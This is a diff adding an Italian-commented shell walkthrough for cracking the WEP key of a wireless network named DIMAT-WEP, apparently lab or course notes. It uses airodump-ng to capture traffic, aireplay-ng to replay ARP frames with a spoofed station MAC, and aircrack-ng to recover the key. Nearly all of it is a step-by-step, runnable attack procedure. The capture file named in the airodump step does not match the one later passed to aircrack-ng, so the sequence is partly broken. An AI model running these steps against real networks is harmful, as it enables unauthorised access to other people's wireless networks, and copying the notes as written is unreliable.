@@ -1,0 +1,66 @@
+
+#di seguito sono elencati i passi necessari per fare il cracking di una rete wifi 
+#protetta con chiave WEP sfruttando la suite di tools aircrack, ed in particolare:
+#airodump: per la cattura di pacchetti 802.11 (sniffer)
+#aireplay: per il packet injection
+#aircrack: per il cracking di chiavi WEP 
+
+
+#diventare amministratore
+sudo su
+
+#disabilitare il network-manager
+/etc/init.d/network-manager stop
+
+#creare una interfaccia di rete virtuale (associata alla scheda wireless) preimpostata 
+#in modalità monitor. Potrebbe essere necessario dover disabilitare la scheda di 
+#rete ad andare in modalità monitor
+iw dev wlan0 interface add wlan0mon type monitor
+
+#per entrare in modalità monitor su una qualsiasi interfaccia:
+(ifconfig nomewlan0 down; iwconfig nomewlan0 mode monitor)
+
+#vedere quali solo le reti WEP vicine e il canale corrispondente
+airodump-ng wlan0mon
+
+#nel nostro caso, DIMAT-WEP lavora sul canale 2, perciò...
+airodump-ng -c 2 -w file_cattura wlan0mon
+
+#in un altro terminale eseguire il seguente comando per ripetere il 
+#sotto-comando ogni 2 secondi
+#(serve per verificare se il file file_cattura.cap cresce)
+watch ls -l
+
+#eseguire il comando aircrack-ng
+#aircrack chiede di scegliere interattivamente un BSSID, scegliamo quello WEP 
+#corrispondente a DIMAT-WEP e 
+#lasciamo che aircrack analizzi i dati crittografati alla ricerca della chiave
+aircrack-ng cattura.cap
+
+#molto probabilmente aircrack ci chiederà di provare con un numero maggiore di IV..
+#Per accellerare questo processo possiamo stimolare l'invio di dati. 
+#Come? Ad esempio, possiamo intercettare un frame e provare a ritrasmetterlo così com è:
+# se è un ping arriverebbe la reply e potrei ritrasmetterla
+#molte volte, analogamente se si tratta di pacchetti ARP.
+#Notare che le repliche arriveranno sempre con IV diversi!
+#Volendo sfruttare i pacchetti ARP l'idea è: individuare i frame ARP destinati all'indirizzo broadcast..
+#Perciò, in un altro terminale proviamo ad eseguire il comando 
+#aireplay-ng che consente di ripetere varie tipologie di frame intercettati 
+#(l'opzione -3 ad esempio identifica i pacchetti ARP, l'opzione -b serve per definire il BSSID su cui
+#si vuole lavorare -si vede dalla schermata di airodump-)
+aireplay-ng -3 wlan0mon -b INDIRIZZO_MAC_BSSID
+
+#A questo punto bisogna individuare un indirizzo MAC di una stazione che 
+#è già associata, se noi non lo siamo.
+#Ci servirà come indirizzo MAC per le repliche false di ARP da inviare.
+#Possiamo utilizzare wireshark per trovare un indirizzo valido o individuarlo nella seconda 
+#parte della schermata di airodump
+aireplay-ng -3 wlan0mon -b INDIRIZZO_MAC_BSSID -h MAC_SORGENTE_DA_USARE_PER_REPLICHE
+
+#Ora, disponendo di molti più IV su cui fare incroci e lavorare, nella 
+#schermata di aircrak dovrebbe in poco tempo apparire la chiave
+
+
+
+
+
